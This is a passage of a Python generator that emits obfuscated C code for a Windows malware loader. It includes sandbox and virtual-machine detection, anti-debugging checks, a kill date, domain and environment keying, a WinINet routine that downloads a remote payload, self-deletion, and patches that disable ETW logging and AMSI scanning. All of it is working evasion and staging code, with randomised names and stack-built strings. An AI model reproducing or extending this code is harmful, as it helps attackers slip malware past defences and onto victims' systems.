    v = {k: rand_id() for k in ['fn', 'd', 'dl', 'k', 'kl', 'S', 'j', 'a', 'b', 'c', 'p', 't']}
    code = tpl("""void @@fn@@(unsigned char* @@d@@, unsigned int @@dl@@, unsigned char* @@k@@, unsigned int @@kl@@) {
    unsigned char @@S@@[256];
    for (int @@a@@ = 0; @@a@@ < 256; @@a@@++) @@S@@[@@a@@] = @@a@@;
    int @@j@@ = 0;
    for (int @@b@@ = 0; @@b@@ < 256; @@b@@++) {
        @@j@@ = (@@j@@ + @@S@@[@@b@@] + @@k@@[@@b@@ % @@kl@@]) % 256;
        unsigned char @@t@@ = @@S@@[@@b@@]; @@S@@[@@b@@] = @@S@@[@@j@@]; @@S@@[@@j@@] = @@t@@;
    }
    int @@p@@ = 0; @@j@@ = 0;
    for (unsigned int @@c@@ = 0; @@c@@ < @@dl@@; @@c@@++) {
        @@p@@ = (@@p@@ + 1) % 256;
        @@j@@ = (@@j@@ + @@S@@[@@p@@]) % 256;
        unsigned char @@t@@ = @@S@@[@@p@@]; @@S@@[@@p@@] = @@S@@[@@j@@]; @@S@@[@@j@@] = @@t@@;
        @@d@@[@@c@@] ^= @@S@@[(@@S@@[@@p@@] + @@S@@[@@j@@]) % 256];
    }
}""", **v)
    return v['fn'], code

def gen_safe_exit(resolve_fn):
    fn = rand_id()
    ptr, r = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtTerminateProcess")
    td = rand_id(8)
    ec = rand_id(6)
    lines = ["static void %s(int %s) {" % (fn, ec)]
    lines.append(r)
    lines.append("    typedef LONG (NTAPI* %s)(HANDLE, LONG);" % td)
    lines.append("    if (%s) ((%s)%s)((HANDLE)-1, (LONG)%s);" % (ptr, td, ptr, ec))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_safe_sleep(resolve_fn):
    fn = rand_id()
    ptr, r = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtDelayExecution")
    td = rand_id(8)
    ms = rand_id(6)
    li = rand_id(6)
    lines = ["static void %s(DWORD %s) {" % (fn, ms)]
    lines.append(r)
    lines.append("    typedef LONG (NTAPI* %s)(BOOLEAN, LARGE_INTEGER*);" % td)
    lines.append("    LARGE_INTEGER %s;" % li)
    lines.append("    %s.QuadPart = -(LONGLONG)%s * 10000;" % (li, ms))
    lines.append("    if (%s) ((%s)%s)(FALSE, &%s);" % (ptr, td, ptr, li))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_sandbox_check(resolve_fn, exit_fn, sleep_fn):
    fn = rand_id()
    p1, rc1 = _multi_resolve(resolve_fn, [
        'LoadLibraryA', 'GetTickCount64', 'CreateToolhelp32Snapshot',
        'Process32First', 'Process32Next', 'CloseHandle',
        'GlobalMemoryStatusEx', 'GetSystemInfo', 'GetDiskFreeSpaceExA',
        'GetModuleHandleA', 'GetUserNameA', 'FindFirstFileA', 'FindClose'])
    u32 = rand_id(8)
    v = {k: rand_id() for k in ['a', 'b', 'sn', 'pe', 'c', 'ms', 'si', 'ds', 'sw', 'sh',
                                  'up', 'un', 'ul', 'cx1', 'cy1', 'cx2', 'cy2', 'pt1', 'pt2',
                                  'rk', 'rv', 'rl', 'rb', 'ff', 'fd', 'fc', 'sc']}
    sleep_ms = random.randint(2500, 5000)
    lines = ["void %s() {" % fn]
    lines.extend(rc1)
    lines.append(c_stack_string("user32.dll", u32))
    lines.append("    %s(%s);" % (p1['LoadLibraryA'], u32))
    p2, rc2 = _multi_resolve(resolve_fn, ['GetSystemMetrics', 'GetCursorPos'])
    lines.extend(rc2)
    adv = rand_id(8)
    lines.append(c_stack_string("advapi32.dll", adv))
    lines.append("    %s(%s);" % (p1['LoadLibraryA'], adv))
    p3, rc3 = _multi_resolve(resolve_fn, ['RegOpenKeyExA', 'RegQueryValueExA', 'RegCloseKey'])
    lines.extend(rc3)
    iph = rand_id(8)
    lines.append(c_stack_string("iphlpapi.dll", iph))
    lines.append("    %s(%s);" % (p1['LoadLibraryA'], iph))
    p4, rc4 = _multi_resolve(resolve_fn, ['GetAdaptersInfo'])
    lines.extend(rc4)
    lines.append("    int %s = 0;" % v['sc'])

    lines.append("    ULONGLONG %s = %s();" % (v['a'], p1['GetTickCount64']))
    lines.append("    %s(%d);" % (sleep_fn, sleep_ms))
    lines.append("    ULONGLONG %s = %s();" % (v['b'], p1['GetTickCount64']))
    lines.append("    if ((%s - %s) < %d) %s(0);" % (v['b'], v['a'], sleep_ms - 500, exit_fn))

    lines.append("    if (%s() < %dULL) %s++;" % (p1['GetTickCount64'], MIN_UPTIME_MS, v['sc']))

    lines.append("    HANDLE %s = %s(0x00000002, 0);" % (v['sn'], p1['CreateToolhelp32Snapshot']))
    lines.append("    if (!%s || %s == INVALID_HANDLE_VALUE) %s(0);" % (v['sn'], v['sn'], exit_fn))
    lines.append("    PROCESSENTRY32 %s;" % v['pe'])
    lines.append("    %s.dwSize = sizeof(%s);" % (v['pe'], v['pe']))
    lines.append("    int %s = 0;" % v['c'])
    lines.append("    if (%s(%s, &%s)) {" % (p1['Process32First'], v['sn'], v['pe']))
    lines.append("        do { %s++; } while (%s(%s, &%s));" % (v['c'], p1['Process32Next'], v['sn'], v['pe']))
    lines.append("    }")
    lines.append("    %s(%s);" % (p1['CloseHandle'], v['sn']))
    lines.append("    if (%s < %d) %s++;" % (v['c'], MIN_PROCESS_COUNT, v['sc']))

    lines.append("    MEMORYSTATUSEX %s;" % v['ms'])
    lines.append("    %s.dwLength = sizeof(%s);" % (v['ms'], v['ms']))
    lines.append("    %s(&%s);" % (p1['GlobalMemoryStatusEx'], v['ms']))
    lines.append("    if (%s.ullTotalPhys < %dULL) %s++;" % (v['ms'], MIN_RAM_BYTES, v['sc']))

    lines.append("    SYSTEM_INFO %s;" % v['si'])
    lines.append("    %s(&%s);" % (p1['GetSystemInfo'], v['si']))
    lines.append("    if (%s.dwNumberOfProcessors < 2) %s++;" % (v['si'], v['sc']))

    lines.append("    ULARGE_INTEGER %s;" % v['ds'])
    ds_str = rand_id(8)
    lines.append(c_stack_string("C:\\", ds_str))
    lines.append("    if (%s(%s, NULL, &%s, NULL)) {" % (p1['GetDiskFreeSpaceExA'], ds_str, v['ds']))
    lines.append("        if (%s.QuadPart < %dULL) %s++;" % (v['ds'], MIN_DISK_BYTES, v['sc']))
    lines.append("    }")

    lines.append("    int %s = %s(0);" % (v['sw'], p2['GetSystemMetrics']))
    lines.append("    int %s = %s(1);" % (v['sh'], p2['GetSystemMetrics']))
    lines.append("    if (%s < %d || %s < %d) %s++;" % (v['sw'], MIN_SCREEN_W, v['sh'], MIN_SCREEN_H, v['sc']))

    lines.append("    typedef struct { LONG x; LONG y; } %s;" % rand_id(8))
    pt_td = lines[-1].split('{')[0].split()[-1].rstrip(';').strip()
    pt_td = rand_id(8)
    lines[-1] = "    typedef struct { LONG x; LONG y; } %s;" % pt_td
    lines.append("    %s %s, %s;" % (pt_td, v['pt1'], v['pt2']))
    lines.append("    if (%s) %s(&%s);" % (p2['GetCursorPos'], p2['GetCursorPos'], v['pt1']))
    lines.append("    %s(3000);" % sleep_fn)
    lines.append("    if (%s) %s(&%s);" % (p2['GetCursorPos'], p2['GetCursorPos'], v['pt2']))
    lines.append("    if (%s.x == %s.x && %s.y == %s.y) %s++;" % (v['pt1'], v['pt2'], v['pt1'], v['pt2'], v['sc']))

    sandbox_dlls = ["sbiedll.dll", "dbghelp.dll", "api_log.dll", "dir_watch.dll",
                    "pstorec.dll", "vmcheck.dll", "wpespy.dll", "cmdvrt32.dll",
                    "cmdvrt64.dll", "cuckoomon.dll"]
    for dll in sandbox_dlls:
        dv = rand_id(8)
        lines.append(c_stack_string(dll, dv))
        lines.append("    if (%s(%s)) %s++;" % (p1['GetModuleHandleA'], dv, v['sc']))

    blacklist = ["sandbox", "virus", "malware", "sample", "test"]
    lines.append("    char %s[256];" % v['un'])
    lines.append("    DWORD %s = 256;" % v['ul'])
    lines.append("    if (%s && %s(%s, &%s)) {" % (p1['GetUserNameA'], p1['GetUserNameA'], v['un'], v['ul']))
    lines.append("        for (DWORD %s = 0; %s < %s; %s++) {" % (v['a'], v['a'], v['ul'], v['a']))
    lines.append("            if (%s[%s] >= 'A' && %s[%s] <= 'Z') %s[%s] += 32;" % (v['un'], v['a'], v['un'], v['a'], v['un'], v['a']))
    lines.append("        }")
    for bl in blacklist:
        bv = rand_id(8)
        lines.append(c_stack_string(bl, bv))
        sv = rand_id(6)
        lines.append("        char* %s = %s;" % (sv, v['un']))
        lines.append("        while (*%s) {" % sv)
        lines.append("            char* %s = %s, *%s = %s;" % (rand_id(6), sv, rand_id(6), bv))
        a2, b2 = lines[-1].split('*')[1].split('=')[0].strip().rstrip(','), lines[-1].split('*')[2].split('=')[0].strip().rstrip(';')
        lines.append("            while (*%s && *%s && *%s == *%s) { %s++; %s++; }" % (a2, b2, a2, b2, a2, b2))
        lines.append("            if (!*%s) { %s += 3; break; }" % (b2, v['sc']))
        lines.append("            %s++;" % sv)
        lines.append("        }")
    lines.append("    }")

    reg_paths = [
        ("SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", "VBox"),
        ("SYSTEM\\CurrentControlSet\\Services\\VBoxMouse", "VBox"),
        ("SYSTEM\\CurrentControlSet\\Services\\vmci", "VMware"),
        ("SYSTEM\\CurrentControlSet\\Services\\vmhgfs", "VMware"),
        ("SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters", "HyperV"),
    ]
    for reg_path, _tag in reg_paths:
        rk_v = rand_id(8)
        rp_v = rand_id(8)
        lines.append("    {")
        lines.append("        HKEY %s = NULL;" % rk_v)
        lines.append(c_stack_string(reg_path, rp_v))
        lines.append("        if (%s && %s((HKEY)(ULONG_PTR)0x80000002u, %s, 0, 0x20019, &%s) == 0) {" % (p3['RegOpenKeyExA'], p3['RegOpenKeyExA'], rp_v, rk_v))
        lines.append("            %s++;" % v['sc'])
        lines.append("            if (%s) %s(%s);" % (p3['RegCloseKey'], p3['RegCloseKey'], rk_v))
        lines.append("        }")
        lines.append("    }")

    fw_key = rand_id(8)
    fw_rk = rand_id(8)
    fw_buf = rand_id(8)
    fw_sz = rand_id(6)
    fw_val = rand_id(8)
    lines.append("    {")
    lines.append("        HKEY %s = NULL;" % fw_rk)
    fwp = "HARDWARE\\Description\\System\\BIOS"
    lines.append(c_stack_string(fwp, fw_key))
    lines.append("        if (%s && %s((HKEY)(ULONG_PTR)0x80000002u, %s, 0, 0x20019, &%s) == 0) {" % (p3['RegOpenKeyExA'], p3['RegOpenKeyExA'], fw_key, fw_rk))
    lines.append("            char %s[256];" % fw_buf)
    lines.append("            DWORD %s = 256;" % fw_sz)
    lines.append(c_stack_string("SystemManufacturer", fw_val))
    lines.append("            if (%s && %s(%s, %s, NULL, NULL, (LPBYTE)%s, &%s) == 0) {" % (p3['RegQueryValueExA'], p3['RegQueryValueExA'], fw_rk, fw_val, fw_buf, fw_sz))
    vm_sigs = ["VBOX", "QEMU", "BOCHS", "VMWARE", "VIRTUAL"]
    for sig in vm_sigs:
        sv2 = rand_id(8)
        lines.append(c_stack_string(sig, sv2))
        iv2 = rand_id(6)
        lines.append("                for (DWORD %s = 0; %s < %s; %s++) {" % (iv2, iv2, fw_sz, iv2))
        lines.append("                    char %s = %s[%s];" % (rand_id(6), fw_buf, iv2))
        ch = lines[-1].split()[1]
        lines.append("                    if (%s >= 'a' && %s <= 'z') %s -= 32;" % (ch, ch, ch))
        lines.append("                    %s[%s] = %s;" % (fw_buf, iv2, ch))
        lines.append("                }")
        mv = rand_id(6)
        lines.append("                {")
        lines.append("                    char* %s = %s;" % (mv, fw_buf))
        lines.append("                    int %s = 0;" % rand_id(6))
        fl = lines[-1].split()[1]
        lines.append("                    while (*%s) {" % mv)
        lines.append("                        if (*%s == %s[%s]) { %s++; if (!%s[%s]) { %s++; break; } } else %s = 0;" % (mv, sv2, fl, fl, sv2, fl, v['sc'], fl))
        lines.append("                        %s++;" % mv)
        lines.append("                    }")
        lines.append("                }")
    lines.append("            }")
    lines.append("            if (%s) %s(%s);" % (p3['RegCloseKey'], p3['RegCloseKey'], fw_rk))
    lines.append("        }")
    lines.append("    }")

    lines.append("    {")
    ai_buf = rand_id(8)
    ai_sz = rand_id(6)
    lines.append("        unsigned char %s[720];" % ai_buf)
    lines.append("        ULONG %s = 720;" % ai_sz)
    lines.append("        if (%s && %s(%s, &%s) == 0) {" % (p4['GetAdaptersInfo'], p4['GetAdaptersInfo'], ai_buf, ai_sz))
    lines.append("            unsigned char* %s = %s + 408;" % (rand_id(6), ai_buf))
    mac_p = lines[-1].split('*')[1].split('=')[0].strip().rstrip(';').strip()
    lines.append("            if (%s[0]==0x08 && %s[1]==0x00 && %s[2]==0x27) %s++;" % (mac_p, mac_p, mac_p, v['sc']))
    lines.append("            if (%s[0]==0x00 && %s[1]==0x0C && %s[2]==0x29) %s++;" % (mac_p, mac_p, mac_p, v['sc']))
    lines.append("            if (%s[0]==0x00 && %s[1]==0x50 && %s[2]==0x56) %s++;" % (mac_p, mac_p, mac_p, v['sc']))
    lines.append("            if (%s[0]==0x00 && %s[1]==0x1C && %s[2]==0x42) %s++;" % (mac_p, mac_p, mac_p, v['sc']))
    lines.append("            if (%s[0]==0x00 && %s[1]==0x03 && %s[2]==0xFF) %s++;" % (mac_p, mac_p, mac_p, v['sc']))
    lines.append("        }")
    lines.append("    }")

    rcf = rand_id(8)
    lines.append(c_stack_string("C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*", rcf))
    lines.append("    {")
    lines.append("        WIN32_FIND_DATAA %s;" % v['fd'])
    lines.append("        HANDLE %s = %s(%s, &%s);" % (v['ff'], p1['FindFirstFileA'], rcf, v['fd']))
    lines.append("        int %s = 0;" % v['fc'])
    lines.append("        if (%s && %s != INVALID_HANDLE_VALUE) {" % (v['ff'], v['ff']))
    lines.append("            %s = 1;" % v['fc'])
    lines.append("            %s(%s);" % (p1['FindClose'], v['ff']))
    lines.append("        }")
    lines.append("        if (!%s) %s++;" % (v['fc'], v['sc']))
    lines.append("    }")

    lines.append("    if (%s >= 3) %s(0);" % (v['sc'], exit_fn))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_anti_debug(resolve_fn, exit_fn):
    fn = rand_id()
    ptr_nqip, r_nqip = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtQueryInformationProcess")
    ptr_gtc, r_gtc = gen_resolve_one(resolve_fn, 'GetThreadContext')
    ptr_qpc, r_qpc = gen_resolve_one(resolve_fn, 'QueryPerformanceCounter')
    v = {k: rand_id() for k in ['peb', 'port', 'dobj', 'st', 'ctx', 'td', 'fp',
                                  'q1', 'q2', 'hw', 'diff']}
    lines = ["void %s() {" % fn]
    lines.append("#ifdef _MSC_VER")
    lines.append("    unsigned char* %s = (unsigned char*)__readgsqword(0x60);" % v['peb'])
    lines.append("#else")
    lines.append("    unsigned char* %s;" % v['peb'])
    lines.append("    __asm__ volatile (\"movq %%%%gs:0x60, %%0\" : \"=r\"(%s));" % v['peb'])
    lines.append("#endif")
    lines.append("    if (%s[2]) %s(0);" % (v['peb'], exit_fn))
    lines.append("    if (*(DWORD*)(%s + 0xBC) & 0x70) %s(0);" % (v['peb'], exit_fn))
    lines.append(r_nqip)
    lines.append(r_gtc)
    lines.append(r_qpc)
    lines.append("    typedef LONG (NTAPI* %s)(HANDLE,ULONG,PVOID,ULONG,PULONG);" % v['td'])
    lines.append("    %s %s = (%s)%s;" % (v['td'], v['fp'], v['td'], ptr_nqip))
    lines.append("    if (%s) {" % v['fp'])
    lines.append("        DWORD_PTR %s = 0;" % v['port'])
    lines.append("        %s((HANDLE)-1, 7, &%s, sizeof(%s), NULL);" % (v['fp'], v['port'], v['port']))
    lines.append("        if (%s) %s(0);" % (v['port'], exit_fn))
    lines.append("        HANDLE %s = NULL;" % v['dobj'])
    lines.append("        LONG %s = %s((HANDLE)-1, 0x1E, &%s, sizeof(%s), NULL);" % (v['st'], v['fp'], v['dobj'], v['dobj']))
    lines.append("        if (%s >= 0) %s(0);" % (v['st'], exit_fn))
    lines.append("    }")
    lines.append("    CONTEXT %s; memset(&%s, 0, sizeof(%s));" % (v['ctx'], v['ctx'], v['ctx']))
    lines.append("    %s.ContextFlags = 0x00100010;" % v['ctx'])
    lines.append("    if (%s) %s((HANDLE)(LONG_PTR)-2, &%s);" % (ptr_gtc, ptr_gtc, v['ctx']))
    lines.append("    if (%s.Dr0 || %s.Dr1 || %s.Dr2 || %s.Dr3) %s(0);" % (v['ctx'], v['ctx'], v['ctx'], v['ctx'], exit_fn))
    lines.append("    LARGE_INTEGER %s, %s;" % (v['q1'], v['q2']))
    lines.append("    if (%s) %s(&%s);" % (ptr_qpc, ptr_qpc, v['q1']))
    lines.append("    volatile int %s = 0; for (int i = 0; i < 100; i++) %s += i;" % (v['hw'], v['hw']))
    lines.append("    if (%s) %s(&%s);" % (ptr_qpc, ptr_qpc, v['q2']))
    lines.append("    LONGLONG %s = %s.QuadPart - %s.QuadPart;" % (v['diff'], v['q2'], v['q1']))
    lines.append("    if (%s > 10000000) %s(0);" % (v['diff'], exit_fn))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_kill_date(year, month, day, resolve_fn, exit_fn):
    fn = rand_id()
    ptr_glt, r_glt = gen_resolve_one(resolve_fn, 'GetLocalTime')
    st = rand_id()
    lines = ["void %s() {" % fn]
    lines.append(r_glt)
    lines.append("    SYSTEMTIME %s;" % st)
    lines.append("    %s(&%s);" % (ptr_glt, st))
    lines.append("    if (%s.wYear > %d) %s(0);" % (st, year, exit_fn))
    lines.append("    if (%s.wYear == %d && %s.wMonth > %d) %s(0);" % (st, year, st, month, exit_fn))
    lines.append("    if (%s.wYear == %d && %s.wMonth == %d && %s.wDay > %d) %s(0);" % (st, year, st, month, st, day, exit_fn))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_guardrails(domain_hash, resolve_fn, exit_fn):
    fn = rand_id()
    ptr_gcnew, r_gcnew = gen_resolve_one(resolve_fn, 'GetComputerNameExW')
    v = {k: rand_id() for k in ['dm', 'sz', 'h', 'i', 'c']}
    lines = ["void %s() {" % fn]
    lines.append(r_gcnew)
    lines.append("    WCHAR %s[256];" % v['dm'])
    lines.append("    DWORD %s = 256;" % v['sz'])
    lines.append("    if (!%s(3, %s, &%s)) %s(0);" % (ptr_gcnew, v['dm'], v['sz'], exit_fn))
    lines.append("    if (%s == 0) %s(0);" % (v['sz'], exit_fn))
    lines.append("    unsigned int %s = %du;" % (v['h'], _hash_seed))
    lines.append("    for (DWORD %s = 0; %s < %s; %s++) {" % (v['i'], v['i'], v['sz'], v['i']))
    lines.append("        WCHAR %s = %s[%s];" % (v['c'], v['dm'], v['i']))
    lines.append("        if (%s >= 65 && %s <= 90) %s += 32;" % (v['c'], v['c'], v['c']))
    lines.append("        %s = ((%s << 5) + %s) + (unsigned int)%s;" % (v['h'], v['h'], v['h'], v['c']))
    lines.append("    }")
    lines.append("    if (%s != 0x%08xu) %s(0);" % (v['h'], domain_hash, exit_fn))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_env_keying(resolve_fn, hash_fn, key_var, exit_fn):
    fn = rand_id()
    ptr_gcn, r_gcn = gen_resolve_one(resolve_fn, 'GetComputerNameA')
    v = {k: rand_id() for k in ['nm', 'sz', 'lo', 'ah', 'hh', 'hd', 'st', 'iv']}
    lines = ["void %s() {" % fn]
    lines.append(r_gcn)
    lines.append("    char %s[256];" % v['nm'])
    lines.append("    DWORD %s = 256;" % v['sz'])
    lines.append("    if (!%s(%s, &%s)) %s(0);" % (ptr_gcn, v['nm'], v['sz'], exit_fn))
    lines.append("    for (DWORD %s = 0; %s < %s; %s++) {" % (v['iv'], v['iv'], v['sz'], v['iv']))
    lines.append("        if (%s[%s] >= 'A' && %s[%s] <= 'Z') %s[%s] += 32;" % (v['nm'], v['iv'], v['nm'], v['iv'], v['nm'], v['iv']))
    lines.append("    }")
    lines.append("    BCRYPT_ALG_HANDLE %s = NULL;" % v['ah'])
    lines.append("    BCRYPT_HASH_HANDLE %s = NULL;" % v['hh'])
    lines.append("    NTSTATUS %s = BCryptOpenAlgorithmProvider(&%s, BCRYPT_SHA256_ALGORITHM, NULL, 0);" % (v['st'], v['ah']))
    lines.append("    if (%s != 0) %s(0);" % (v['st'], exit_fn))
    lines.append("    %s = BCryptCreateHash(%s, &%s, NULL, 0, NULL, 0, 0);" % (v['st'], v['ah'], v['hh']))
    lines.append("    if (%s != 0) { BCryptCloseAlgorithmProvider(%s, 0); %s(0); }" % (v['st'], v['ah'], exit_fn))
    lines.append("    BCryptHashData(%s, (PUCHAR)%s, %s, 0);" % (v['hh'], v['nm'], v['sz']))
    lines.append("    unsigned char %s[32];" % v['hd'])
    lines.append("    BCryptFinishHash(%s, %s, 32, 0);" % (v['hh'], v['hd']))
    lines.append("    BCryptDestroyHash(%s);" % v['hh'])
    lines.append("    BCryptCloseAlgorithmProvider(%s, 0);" % v['ah'])
    for i in range(32):
        lines.append("    %s[%d] ^= %s[%d];" % (key_var, i, v['hd'], i))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_staging(resolve_fn, url):
    fn = rand_id()
    ol = rand_id()
    ptr_lla, r_lla = gen_resolve_one(resolve_fn, 'LoadLibraryA')
    wi_var = rand_id(8)
    url_var = rand_id(8)
    lines = ["unsigned char* %s(unsigned int* %s) {" % (fn, ol)]
    lines.append(r_lla)
    lines.append(c_stack_string("wininet.dll", wi_var))
    lines.append("    %s(%s);" % (ptr_lla, wi_var))
    ptr_ioa, r_ioa = gen_resolve_one(resolve_fn, 'InternetOpenA')
    ptr_ioua, r_ioua = gen_resolve_one(resolve_fn, 'InternetOpenUrlA')
    ptr_irf, r_irf = gen_resolve_one(resolve_fn, 'InternetReadFile')
    ptr_ich, r_ich = gen_resolve_one(resolve_fn, 'InternetCloseHandle')
    lines.append(r_ioa)
    lines.append(r_ioua)
    lines.append(r_irf)
    lines.append(r_ich)
    lines.append(c_stack_string(url, url_var))
    hn = rand_id(8)
    hu = rand_id(8)
    buf = rand_id(8)
    total = rand_id(6)
    chunk = rand_id(6)
    lines.append("    if (!%s || !%s || !%s || !%s) return NULL;" % (ptr_ioa, ptr_ioua, ptr_irf, ptr_ich))
    lines.append("    void* %s = %s(NULL, 0, NULL, NULL, 0);" % (hn, ptr_ioa))
    lines.append("    if (!%s) return NULL;" % hn)
    lines.append("    void* %s = %s(%s, %s, NULL, 0, 0x84000200u, 0);" % (hu, ptr_ioua, hn, url_var))
    lines.append("    if (!%s) { %s(%s); return NULL; }" % (hu, ptr_ich, hn))
    lines.append("    unsigned char* %s = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, %d);" % (buf, STAGING_MAX_SIZE))
    lines.append("    if (!%s) { %s(%s); %s(%s); return NULL; }" % (buf, ptr_ich, hu, ptr_ich, hn))
    avail = rand_id(6)
    lines.append("    DWORD %s = 0, %s = 0;" % (total, chunk))
    lines.append("    while (1) {")
    lines.append("        DWORD %s = %d - %s; if (%s > 4096) %s = 4096;" % (avail, STAGING_MAX_SIZE, total, avail, avail))
    lines.append("        if (%s == 0 || !%s(%s, %s + %s, %s, &%s) || %s == 0) break;" % (avail, ptr_irf, hu, buf, total, avail, chunk, chunk))
    lines.append("        %s += %s;" % (total, chunk))
    lines.append("    }")
    lines.append("    %s(%s);" % (ptr_ich, hu))
    lines.append("    %s(%s);" % (ptr_ich, hn))
    lines.append("    *%s = %s;" % (ol, total))
    lines.append("    return %s;" % buf)
    lines.append("}")
    return fn, "\n".join(lines)

def gen_self_delete(resolve_fn):
    fn = rand_id()
    ptr_gmfn, r_gmfn = gen_resolve_one(resolve_fn, 'GetModuleFileNameA')
    ptr_cfa, r_cfa = gen_resolve_one(resolve_fn, 'CreateFileA')
    ptr_sfibh, r_sfibh = gen_resolve_one(resolve_fn, 'SetFileInformationByHandle')
    ptr_ch, r_ch = gen_resolve_one(resolve_fn, 'CloseHandle')
    pth = rand_id(8)
    h1 = rand_id(8)
    h2 = rand_id(8)
    frn = rand_id(8)
    fdi = rand_id(8)
    lines = ["void %s() {" % fn]
    lines.append(r_gmfn)
    lines.append(r_cfa)
    lines.append(r_sfibh)
    lines.append(r_ch)
    lines.append("    char %s[MAX_PATH];" % pth)
    lines.append("    %s(NULL, %s, MAX_PATH);" % (ptr_gmfn, pth))
    lines.append("    HANDLE %s = %s(%s, 0x00010000, 1, NULL, 3, 0, NULL);" % (h1, ptr_cfa, pth))
    lines.append("    if (%s == INVALID_HANDLE_VALUE) return;" % h1)
    lines.append("    unsigned char %s[32];" % frn)
    lines.append("    memset(%s, 0, 32);" % frn)
    lines.append("    *(DWORD*)(%s + 16) = 4;" % frn)
    lines.append("    %s[20] = 0x3A; %s[22] = 0x78;" % (frn, frn))
    lines.append("    %s(%s, 3, %s, 24);" % (ptr_sfibh, h1, frn))
    lines.append("    %s(%s);" % (ptr_ch, h1))
    lines.append("    HANDLE %s = %s(%s, 0x00010000, 1, NULL, 3, 0, NULL);" % (h2, ptr_cfa, pth))
    lines.append("    if (%s == INVALID_HANDLE_VALUE) return;" % h2)
    lines.append("    unsigned char %s[4] = {1, 0, 0, 0};" % fdi)
    lines.append("    %s(%s, 4, %s, 4);" % (ptr_sfibh, h2, fdi))
    lines.append("    %s(%s);" % (ptr_ch, h2))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_find_pid(resolve_fn):
    v = {k: rand_id() for k in ['fn', 'nm', 'sn', 'pe', 'r']}
    p, rc = _multi_resolve(resolve_fn, ['CreateToolhelp32Snapshot', 'Process32First', 'Process32Next', 'CloseHandle'])
    lines = ["DWORD %s(const char* %s) {" % (v['fn'], v['nm'])]
    lines.extend(rc)
    lines.append("    HANDLE %s = %s(0x00000002, 0);" % (v['sn'], p['CreateToolhelp32Snapshot']))
    lines.append("    if (!%s || %s == INVALID_HANDLE_VALUE) return 0;" % (v['sn'], v['sn']))
    lines.append("    PROCESSENTRY32 %s;" % v['pe'])
    lines.append("    %s.dwSize = sizeof(%s);" % (v['pe'], v['pe']))
    lines.append("    DWORD %s = 0;" % v['r'])
    lines.append("    if (%s(%s, &%s)) {" % (p['Process32First'], v['sn'], v['pe']))
    lines.append("        do {")
    lines.append("            if (_stricmp(%s.szExeFile, %s) == 0) { %s = %s.th32ProcessID; break; }" % (v['pe'], v['nm'], v['r'], v['pe']))
    lines.append("        } while (%s(%s, &%s));" % (p['Process32Next'], v['sn'], v['pe']))
    lines.append("    }")
    lines.append("    %s(%s);" % (p['CloseHandle'], v['sn']))
    lines.append("    return %s;" % v['r'])
    lines.append("}")
    return v['fn'], "\n".join(lines)

def gen_patch_etw(resolve_fn):
    fn = rand_id()
    ptr_vp, r_vp = gen_resolve_one(resolve_fn, 'VirtualProtect')
    ptr_etw, r_etw = gen_resolve_raw(resolve_fn, "ntdll.dll", "EtwEventWrite")
    op = rand_id(8)
    pt = rand_id(8)
    patches = [
        [0xC3],
        [0x33, 0xC0, 0xC3],
        [0x48, 0x33, 0xC0, 0xC3],
    ]
    patch = random.choice(patches)
    patch_len = len(patch)
    hex_str = ", ".join("0x%02x" % b for b in patch)
    lines = ["void %s() {" % fn]
    lines.append(r_vp)
    lines.append(r_etw)
    lines.append("    if (!%s || !%s) return;" % (ptr_etw, ptr_vp))
    lines.append("    DWORD %s;" % op)
    lines.append("    if (!%s(%s, %d, PAGE_EXECUTE_READWRITE, &%s)) return;" % (ptr_vp, ptr_etw, patch_len, op))
    lines.append("    unsigned char %s[] = {%s};" % (pt, hex_str))
    lines.append("    memcpy(%s, %s, %d);" % (ptr_etw, pt, patch_len))
    lines.append("    %s(%s, %d, %s, &%s);" % (ptr_vp, ptr_etw, patch_len, op, op))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_patch_amsi(resolve_fn):
    fn = rand_id()
    ptr_vp, r_vp = gen_resolve_one(resolve_fn, 'VirtualProtect')
    ptr_lla, r_lla = gen_resolve_one(resolve_fn, 'LoadLibraryA')
    ad = rand_id(8)
    hm = rand_id(8)
    op = rand_id(8)
    pt = rand_id(8)
    patches = [
        [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3],
        [0x33, 0xC0, 0x05, 0x57, 0x00, 0x07, 0x80, 0xC3],
        [0x48, 0x31, 0xC0, 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3],
    ]
    patch = random.choice(patches)
    patch_len = len(patch)
    hex_str = ", ".join("0x%02x" % b for b in patch)
    lines = ["void %s() {" % fn]
    lines.append(r_vp)
    lines.append(r_lla)
    lines.append(c_stack_string("amsi.dll", ad))
    lines.append("    HMODULE %s = %s(%s);" % (hm, ptr_lla, ad))
    lines.append("    if (!%s) return;" % hm)
    ptr_asb, r_asb = gen_resolve_raw(resolve_fn, "amsi.dll", "AmsiScanBuffer")
    lines.append(r_asb)
    lines.append("    if (!%s || !%s) return;" % (ptr_asb, ptr_vp))
    lines.append("    DWORD %s;" % op)
    lines.append("    if (!%s(%s, %d, PAGE_EXECUTE_READWRITE, &%s)) return;" % (ptr_vp, ptr_asb, patch_len, op))
    lines.append("    unsigned char %s[] = {%s};" % (pt, hex_str))
    lines.append("    memcpy(%s, %s, %d);" % (ptr_asb, pt, patch_len))
    lines.append("    %s(%s, %d, %s, &%s);" % (ptr_vp, ptr_asb, patch_len, op, op))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_hwbp_bypass(resolve_fn, do_amsi, do_etw):
    g0 = rand_id(8)
    g1 = rand_id(8)
    handler_fn = rand_id()
    setup_fn = rand_id()
    ep = rand_id(6)
    lines = []
    lines.append("static void* %s = NULL;" % g0)
    lines.append("static void* %s = NULL;" % g1)
    lines.append("")
    lines.append("static LONG CALLBACK %s(EXCEPTION_POINTERS* %s) {" % (handler_fn, ep))
